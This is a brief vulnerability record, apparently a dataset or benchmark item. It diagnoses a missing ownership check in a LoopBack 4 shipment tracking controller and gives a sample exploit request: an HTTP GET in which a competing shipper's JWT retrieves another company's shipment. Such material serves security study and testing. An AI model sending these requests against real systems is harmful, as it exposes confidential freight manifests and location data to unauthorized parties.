diagnosis: The LoopBack 4 shipment tracking controller authenticates JWT callers but queries shipmentRepository.findById(id) without validating that shipment.shipperId matches the authenticated currentUser.shipperId, exposing freight manifest and GPS coordinates to other logistics companies.
exploit_request:
GET /api/v1/shipments/shp-container-8821 HTTP/1.1
Host: freight.logistics-hub.com
Authorization: Bearer <competing_shipper_jwt>
Accept: application/json
